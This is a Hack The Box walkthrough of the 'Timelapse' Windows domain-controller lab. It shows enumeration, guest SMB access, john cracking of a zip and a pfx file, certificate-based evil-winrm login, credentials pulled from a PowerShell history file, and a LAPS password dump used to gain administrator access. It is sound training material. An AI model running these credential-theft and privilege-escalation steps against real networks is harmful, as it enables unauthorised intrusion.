---
title: "Hack The Box - Timelapse Walkthrough"
date: 2022-08-21T07:00:00+02:00
description: "Hack The Box Timelapse Walkthrough/Write-Up."
featured: false
draft: false
toc: false
# menu: main
usePageBundles: false
featureImage: "/images/timelapse_htb.png"
#featureImageAlt: 'Description of image'
#featureImageCap: 'This is the featured image.'
thumbnail: "/images/timelapse_htb.png"
shareImage: "/images/timelapse_htb.png"
codeMaxLines: 20
codeLineNumbers: false
figurePositionShow: true
categories:
  - Walkthroughs
tags:
  - Hack the Box
  - Windows
---
Welcome back! Today we are going to solve the Timelapse machine from Hack The Box. Timelapse is an easy box which focuses on accesible SMB shares and a lot of hash cracking to get the initial foothold. We then find configuration files that allow us to login to the system as the administrator user. 

## Foothold
Let's start off with a basic nmap scan. We use -Pn to skip host discovery, -sC to enumerate services, -sV to enumerate service versions and -oN to write to Nmap readable format. 

```sh
nmap -Pn -sC -sV -oN nmap/initial timelapse.htb
```

Which shows us the following results:

```text
PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-01 16:07:20Z)
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds?
464/tcp open  kpasswd5?
593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp open  ldapssl?
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m06s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-04-01T16:07:28
|_  start_date: N/A
```

We find the domain (timelapse.htb) and the host (DC01). We also see that DNS, Kerberos, LDAP and LDAPSSL are open, which also indicates that we are dealing with a domain controller. Before we dig into the results and start enumerating, we first start a more elaborate background port scan on all ports using -p- flag to specify all ports.

```sh
nmap -Pn -sC -sV -p- -oN nmap/all_ports timelapse.htb
```

Let's start off by enumerating RPC using rpcdump.py.

```sh
rpcdump.py timelapse.htb
```

RPCDump found 398 endpoints, however no useful information to obtain a foothold onto the system was found. We continue with SMB. We run [nulllinux.py](https://github.com/m8r0wn/nullinux) to see if we can find any interesting information over port 139/445. 

```sh
python3 nullinux/nullinux.py timelapse.htb
```

But again, no luck, as we receive an "access denied" on most checks. All we find is a domain name "TIMELAPSE" and a domain SID "S-1-5-21-671920749-559770252-3318990721".

We try to enumerate users through nmap's krb5-enum-users script, since we know the domain:

```sh
nmap -Pn --script krb5-enum-users --script-args krb5-enum-users.realm="timelapse" -p 88 timelapse.htb
```

Which shows us the guest and administrator users.

```text
PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|     guest@timelapse
|_    administrator@timelapse
```

Which isn't of much use for us. 

Next, we try to connect with LDAP to try and extract data. For this we write a simple python3 script to try and connect to LDAPS with the following syntax:

```python
import ldap3
server = ldap3.Server("timelapse.htb", get_info = ldap3.ALL, port = 636, use_ssl = True)
connection = ldap3.Connection(server)
connection.bind()
server.info
```

Which returns a "Connection reset by peer" error, meaning we can't connect to LDAP without authentication. 

Let's try to enumerate SMB now, using guest access. To do this, we specify the % sign as the username.

```sh
smbmap -H timelapse.htb -u %
```

Which returns several default shares, but one interesting read only share named "Shares":

```text
[+] Guest session       IP: timelapse.htb:445   Name: unknown                                           
        Disk                                                    Permissions     
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS       
        C$                                                      NO ACCESS       
        IPC$                                                    READ ONLY       
        NETLOGON                                                NO ACCESS       
        Shares                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       
```

We connect to the share using smbclient, and download all files that are available to us:

```sh
smbclient //timelapse.htb/Shares -U -I timelapse.htb
>> recurse ON
>> prompt OFF
>> mget *
```

In the /dev/ share we find a winrm_backup.zip that is password protected. We use zip2john to translate the zip file to a hash so that we can use john to crack it.

```sh
zip2john winrm_backup.zip > hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

We manage to crack the password, and manage to extract a .pfx file. This .pfx file is also password protected, so we use pfx2john to translate the file to a hash so we can crack it.

```sh
pfx2john legacyy_dev_auth.pfx > pfx_hash

john --wordlist=/usr/share/wordlists/rockyou.txt pfx_hash
```

After two minutes we managed to crack the pfx file and obtain the password. We double click the .pfx file and find the "identity:Legacyy" entry, indicating that legacyy could be a potential username. 

We use openssl to extract the private key from the .pfx file.

```sh
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out private.key
```

We now have an encrypted private key. We decrypt it using the following command:

```sh
openssl rsa -in private.key -out decrypted_private.key
```

We use openssl to extract the certificate from the .pfx file:

```sh
# extract encrypted .crt file
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt

# extract decrypted .cer file
openssl x509 -inform pem -in cert.crt -outform der -out cert.cer
```

We now have a potential username (legacyy) and a decrypted certificate and private key. We use evil-winrm to connect to the box.

```sh
evil-winrm -i timelapse.htb -k decrypted_private.key -c cert.cer -S
```

We navigate to the desktop and find user.txt

```text
*Evil-WinRM* PS C:\Users\legacyy\Desktop> dir


    Directory: C:\Users\legacyy\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         4/1/2022   9:04 AM             34 user.txt


*Evil-WinRM* PS C:\Users\legacyy\Desktop> whoami
timelapse\legacyy
```

## Privilege Escalation
We upload Winpeas and run it. Winpeas shows us that our user has a powershell history file located under "C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt", which contains the following information

```text
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString '[...REDACTED...]' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

We use evil-winrm to setup another session with the new credentials that we found. As the password contains a $, we have to escape it using the \ character before logging in.

```sh
evil-winrm -i timelapse.htb -u "svc_deploy" -p "xxR\$Q62^12xxxxKWaxxxV" -P 5986 -S
```

We navigate through the filesystem, and find that LAPS is installed. Knowing this, we look for a simple powershell script to look for credentials. For this we use the following script:

```powershell
$Computers = Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
$Computers | Sort-Object ms-Mcs-AdmPwdExpirationTime | Format-Table -AutoSize Name, DnsHostName, ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
```

We run the script and find administrator credentials:

```text
.\password_dump.ps1


Name  DnsHostName        ms-Mcs-AdmPwd            ms-Mcs-AdmPwdExpirationTime
----  -----------        -------------            ---------------------------
WEB01
DEV01
DB01
DC01  dc01.timelapse.htb [...REDACTED...] 132937346648463515
```

We use these credentials to logon the box as the administrator user through evil-winrm, and find the root.txt and thereby complete the box. 

```text
*Evil-WinRM* PS C:\Users\TRX> whoami
timelapse\administrator
*Evil-WinRM* PS C:\Users\TRX> dir Desktop


    Directory: C:\Users\TRX\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         4/1/2022   9:04 AM             34 root.txt
```

I hope this walkthrough has been useful to you and taught you a thing or two. Thanks for reading, and see you in my next walkthrough!
